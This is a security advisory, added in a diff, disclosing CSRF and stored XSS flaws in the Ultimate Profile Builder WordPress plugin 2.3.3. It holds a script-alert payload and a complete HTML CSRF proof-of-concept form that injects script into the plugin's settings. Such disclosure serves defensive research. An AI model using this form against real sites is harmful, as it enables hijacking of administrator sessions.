@@ -1,0 +1,92 @@
+================================================================
+CSRF/Stored XSS Vulnerability in Ultimate profile Builder Plugin 
+================================================================
+
+
+. contents:: Table Of Content
+
+Overview
+========
+
+* Title :CSRF and Stored XSS Vulnerability in Ultimate Profile Builder  Wordpress Plugin 
+* Author: Kaustubh G. Padwad
+* Plugin Homepage: https://downloads.wordpress.org/plugin/ultimate-profile-builder.zip
+* Severity: HIGH
+* Version Affected: Version 2.3.3 and mostly prior to it
+* Version Tested : Version 2.3.3
+* version patched:
+
+Description 
+===========
+
+Vulnerable Parameter 
+--------------------
+
+* Label
+* CSS Class atribute
+
+About Vulnerability
+-------------------
+This plugin is vulnerable to a combination of CSRF/XSS attack meaning that if an admin user can be tricked to visit a crafted URL created by attacker (via spear phishing/social engineering), the attacker can insert arbitrary script into admin page. Once exploited, admin's browser can be made to do almost anything the admin user could typically do by hijacking admin's cookies etc.
+
+Vulnerability Class
+=================== 
+Cross Site Request Forgery (https://www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29)
+Cross Site Scripting (https://www.owasp.org/index.php/Top_10_2013-A3-Cross-Site_Scripting_(XSS)
+
+Steps to Reproduce: (POC)
+=========================
+
+After installing the plugin
+
+1. Goto settings -> Ultimate profile Builder
+
+2. Insert this payload ## <script>alert("1")</script> ## Into  above mention Vulnerable parameter Save settings and see XSS in action
+
+3. Visit Ultimate Profile Builder settings page of this plugin anytime later and you can see the script executing as it is stored.
+
+Plugin does not uses any nonces and hence, the same settings can be changed using CSRF attack and the PoC code for the same is below
+
+CSRF POC Code
+=============
+
+* <html>
+*  <body>
+*    <form action="http://127.0.0.1/wp/wp-admin/admin.php?page=UltimatePB_Field" method="POST">
+*      <input type="hidden" name="select_type" value="heading" />
+*      <input type="hidden" name="field_user_groups[]" value="administrator" />
+*      <input type="hidden" name="field_name" value="<script>alert("1")</script>" />
+*      <input type="hidden" name="field_value" value="<script>alert("1")</script>" />
+*      <input type="hidden" name="field_class" value="<script>alert("1")</script>" />
+*      <input type="hidden" name="field_maxLenght" value="" />
+*      <input type="hidden" name="field_cols" value="" />
+*      <input type="hidden" name="field_rows" value="" />
+*      <input type="hidden" name="field_Options" value="" />
+*      <input type="hidden" name="field_Des" value="<script>alert("1")</script>" />
+*      <input type="hidden" name="field_ordering" value="1" />
+*      <input type="hidden" name="field_submit" value="Save" />
+*      <input type="submit" value="Submit request" />
+*    </form>
+*  </body>
+* </html>
+
+Mitigation 
+==========
+No Update
+
+Change Log
+==========
+no Update
+
+Disclosure 
+==========
+11-April-2015 Reported to Developer
+No Update
+credits
+=======
+* Kaustubh Padwad 
+* Information Security Researcher
+* kingkaustubh (at) me (dot) com 
+* https://twitter.com/s3curityb3ast
+* http://breakthesec.com
+* https://www.linkedin.com/in/kaustubhpadwad
